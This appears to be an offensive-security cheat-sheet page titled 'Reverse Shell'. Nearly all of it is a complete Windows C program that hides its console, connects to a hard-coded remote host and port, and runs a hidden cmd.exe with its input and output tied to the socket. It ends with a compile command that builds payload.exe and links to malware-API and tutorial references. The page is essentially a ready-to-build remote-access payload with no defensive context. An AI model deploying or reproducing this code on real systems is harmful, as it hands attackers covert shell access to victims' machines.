# Reverse Shell

## WinAPI

```c
#include <stdio.h>
#include <winsock2.h> // This must come before windows.h to avoid collision with winsock.h
#include <windows.h>
#include <winbase.h>
#include <ws2tcpip.h> // Must include this

#pragma comment(lib, "ws2_32.lib")

#define REMOTE_ADDR "192.168.1.2"
#define REMOTE_PORT "443"

int main(int argc, char *argv[]) {
	FreeConsole();
	WSADATA windows_socket_api_data;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	int iResult = WSAStartup(MAKEWORD(2, 2), &windows_socket_api_data);
	struct addrinfo *result = NULL,	*ptr = NULL, hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	
	getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
	
	ptr = result;

	SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);	
	connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)ConnectSocket;
	si.hStdOutput = (HANDLE)ConnectSocket;
	si.hStdError = (HANDLE)ConnectSocket;

	TCHAR cmd[] = TEXT("C:\\Windows\\system32\\cmd.exe");
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL,	NULL, &si, &pi);

	WaitForSingleObject(pi.hProcess, INFINITE);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	WSACleanup();
}
```

Compile the payload.

```
$ x86_64-w64-mingw32-gcc -l ws2_32 -o payload.exe payload.c
```

---
## References

### MalAPI

- [MalAPI: `WSAStartup`](https://malapi.io/winapi/WSAStartup)

### Cocomelonc

- [Cocomelonc: Simple C++ reverse shell for windows](https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html)